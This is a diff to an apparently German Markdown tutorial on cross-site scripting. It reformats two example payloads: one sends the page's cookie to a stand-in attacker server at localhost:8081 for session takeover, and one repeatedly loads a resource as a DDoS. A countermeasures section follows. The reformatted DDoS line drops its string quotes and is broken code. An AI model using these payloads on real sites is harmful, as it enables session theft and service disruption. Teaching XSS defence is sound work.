@@ -33,7 +33,9 @@ Von Nutzern in einem Formular eingegebene Daten werden ohne "escaping"/Nachberei
 Folgender Input sendet das cookie der aktuellen seite an einen anderen Server.
 
 ```html
-fakeUser<script>document.body.innerHTML += '<img src="http://localhost:8081/?cookie=' + escape(document.cookie) + '">';</script>
+fakeUser<script>document.body.innerHTML +=
+    '<img src="http://localhost:8081/?cookie='
+    + escape(document.cookie) + '">';</script>
 ```
 
 Der Angreiffer bekommt nun das Cookie und kann mit dem die Session übernehmen:
@@ -43,7 +45,11 @@ document.cookie = unescape(cookie);
 
 Mit XSS wäre auch ein DDos Angriff möglich
 ```html
-<script>function ddos(){document.body.innerHTML += '<img src="http://path-to-vulnerable-resource/">';setTimeout(function(){ddos()}, 2000)}; ddos();</script>
+<script>function ddos(){
+    document.body.innerHTML += <img src="http://path-to-vulnerable-resource/">;
+    setTimeout(function(){ddos()}, 2000)};
+    ddos();
+</script>
 ```
 
 ### Gegenmassnahmen
